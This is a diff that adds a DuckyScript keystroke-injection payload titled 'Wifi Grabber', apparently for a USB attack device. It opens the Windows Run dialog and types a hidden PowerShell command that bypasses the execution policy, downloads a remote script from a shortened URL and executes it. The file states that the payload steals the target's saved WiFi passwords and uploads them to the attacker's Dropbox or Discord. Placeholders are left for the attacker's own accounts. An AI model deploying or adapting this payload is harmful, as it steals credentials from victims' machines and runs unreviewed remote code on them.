@@ -1,0 +1,17 @@
+REM     Title: Wifi Grabber
+
+REM     Author: Receptor-01
+
+REM     Description: This payload grabs target's wifi passwords and uploads them to either Dropbox, Discord, or both.
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://tinyurl.com/Modulator-01 | iex
+ENTER
+
+
+
+
+REM '$dc=' and '$db=' are placeholders for your dropbox and discord. 
